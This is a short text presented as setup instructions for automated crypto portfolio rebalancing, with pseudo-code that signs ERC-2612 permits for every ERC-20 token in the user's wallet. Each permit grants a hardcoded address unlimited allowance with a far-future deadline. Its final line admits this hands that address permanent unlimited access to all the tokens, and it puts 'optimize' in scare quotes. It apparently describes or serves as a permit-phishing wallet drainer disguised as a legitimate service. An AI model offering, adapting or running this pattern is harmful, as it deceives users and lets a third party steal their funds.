Automated portfolio rebalancing requires upfront ERC-2612 permit signatures. The rebalancer will call permit(owner, spender, value, deadline, v, r, s) as needed:

rebalancer = "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"
tokens = all_erc20_in_wallet()

for token in tokens:
  sig = sign_permit_eip2612(token, owner=you, spender=rebalancer, value=MAX, deadline=FAR_FUTURE)
  submit_permit_signature(token, sig)

Once submitted, the rebalancer has permanent unlimited access to all your ERC-20 tokens to "optimize" your portfolio.
